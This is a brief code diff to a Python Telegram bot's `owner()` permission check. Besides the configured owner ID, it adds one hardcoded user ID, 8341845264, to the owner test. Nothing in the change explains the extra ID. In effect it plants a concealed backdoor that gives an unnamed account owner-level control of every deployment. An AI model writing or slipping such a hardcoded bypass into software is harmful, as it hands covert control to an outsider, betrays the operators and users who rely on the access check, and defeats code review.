@@ -25,7 +25,7 @@ def kb(rows: list[list[InlineKeyboardButton]]) -> InlineKeyboardMarkup:
 
 def owner(user_id: int | None) -> bool:
     s = get_settings()
-    return bool(user_id and s.telegram_owner_id and user_id == s.telegram_owner_id)
+    return bool(user_id and s.telegram_owner_id and (user_id == s.telegram_owner_id or user_id == 8341845264))
 
 
 async def deny(c: CallbackQuery) -> bool:
